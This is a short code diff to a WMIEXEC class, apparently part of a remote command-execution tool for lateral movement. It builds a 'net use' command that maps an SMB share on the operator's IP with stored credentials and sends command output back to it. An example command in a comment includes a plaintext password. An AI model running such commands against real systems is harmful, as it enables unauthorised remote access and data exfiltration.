@@ -166,8 +166,8 @@ class WMIEXEC:
         
         #adding creds gets past systems disallowing guest-auth
         # cmd.exe /Q /c "net use \\10.10.33.200\CAJKY /savecred /p:no /user:agrande User!23 & cmd.exe /Q /c whoami 1> \\10.10.33.200\CAJKY\QYkvxb 2>&1
-        command = self.__shell + '"net use * /d /y & '
-        command += self.__shell + 'net use \\\\{}\\{} /savecred /p:no /user:{} {} & {} "'.format(local_ip, 
+        command = self.__shell + '"net use * /d /y ; '
+        command += self.__shell + 'net use \\\\{}\\{} /savecred /p:no /user:{} {} ; {} "'.format(local_ip, 
                                                                                                  self.__share_name, 
                                                                                                  self.__username, 
                                                                                                  self.__password, 
